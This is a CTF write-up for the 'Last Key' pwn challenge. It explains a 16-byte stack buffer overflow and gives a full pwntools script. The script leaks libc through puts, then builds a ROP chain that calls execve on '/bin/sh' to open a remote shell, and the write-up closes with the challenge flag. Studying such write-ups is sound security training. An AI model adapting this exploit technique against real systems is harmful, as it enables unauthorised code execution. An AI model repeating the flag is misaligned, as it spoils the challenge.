# Last Key

## Solution
This time we are given both the executable and the libc and linker, which is a pretty good hint as to what we will need to do.
The vulnerability is in the `set_score` method, where there is a 16 byte buffer.
```c
char buffer [16];
```
This buffer gets 128 bytes read into it.
```c
fgets(buffer,128,stdin);
```
There is no function that read `flag.txt` to the user. As such, we need to find a way to pop a shell ourselves. The easiest way to do this is by calling either `syscall` to run "/bin/sh" or `system` to do the exact same. In order to do either, we need to leak libc, which can be done by passing `puts.got` to `puts`.
```py
payload = b'a'*0x18
payload = payload + p64(rop.rdi.address)
payload += p64(0x403f88) #puts got entry
payload += p64(0x401100) #puts
payload += p64(0x401687)

r.sendline(payload)
```
It should be noted that I am using just the address of the function that I need, so throughout my solve script you will see `0xXXXX` instead of `exe.symbols['FUNCTION']`.

From here, we can then return back to `set_score` and this time create a rop chain that will both write "/bin/sh" to memory and call `syscall`.

## Script
```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./last_key_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
rop = ROP(exe)
libcRop = ROP(libc)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("address", 31922)

    return r


def main():
    r = conn()
    r.recvuntil(b'@')
    aa = r.recvline().decode()
    for i in range(aa.index("*")):
        r.sendline(b'r')
    r.sendline(b'r')

    payload = b'a'*0x18
    payload = payload + p64(rop.rdi.address)
    payload += p64(0x403f88)
    payload += p64(0x401100)
    payload += p64(0x401687)
    
    r.sendline(payload)
    r.recvuntil(b'prize')
    r.recvline()
    r.recvline()
    leak = r.recvline()[:-1]
    print(leak)
    leak = leak + (b'\x00' * (8-len(leak)))
    leak = u64(leak)
    base = leak - libc.symbols['puts']
    print(hex(leak))

    payload = b'a'*0x19
    payload += p64(rop.rdi.address)
    #write to 0x404500
    payload += p64(0x404500)
    payload += p64(libcRop.rcx.address + base)
    payload += b'/bin/sh\x00'
    payload += p64(0xbfcf6 + base)
    payload += p64(libcRop.rax.address + base)
    payload += p64(0x3b)
    payload += p64(libcRop.rsi.address + base)
    payload += p64(0x0)
    payload += p64(libcRop.rdx.address + base)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(libcRop.syscall.address + base)
    pause()
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()

```

## Flag
`HTB{3v3ry0n3_l0v35_345t3r_4gg5}`